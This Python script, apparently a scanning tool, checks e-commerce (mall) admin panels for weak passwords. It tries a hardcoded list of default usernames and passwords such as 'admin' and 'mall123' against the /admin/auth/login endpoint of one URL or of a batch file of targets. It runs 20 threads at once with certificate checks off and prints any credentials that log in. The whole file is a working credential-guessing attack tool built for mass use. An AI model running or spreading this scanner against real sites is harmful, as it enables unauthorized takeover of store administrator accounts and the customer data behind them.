import requests
import argparse
import concurrent.futures

def checkLogin(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    }
    user_list = ['admin','admin123','mall123','promotion123']
    pass_list = ['admin','admin123','mall123','promotion123']
    for i in user_list:
        for j in pass_list:
            data = {"username": i , "password": j}
            try:
                res = requests.post(f"{url}/admin/auth/login", headers=headers, json=data, timeout=5, verify=False)
                if res.status_code == 200 and res.text:
                    if "成功" in res.text:
                        print(f"\033[1;32m[+] {url} Login Seccess! username:{i}&password:{j}" + "\033[0m")
                        return True
                    else:
                        pass

                else:
                    pass
            except Exception:
                print(f"\033[1;31m[-] {url} 连接出错!" + "\033[0m")




def banner():
    print("""
     ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                     
                                                                        By:Bu0uCat             
    """)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个商城弱口令检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f","--file",type=str,help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkLogin(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        #使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkLogin, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")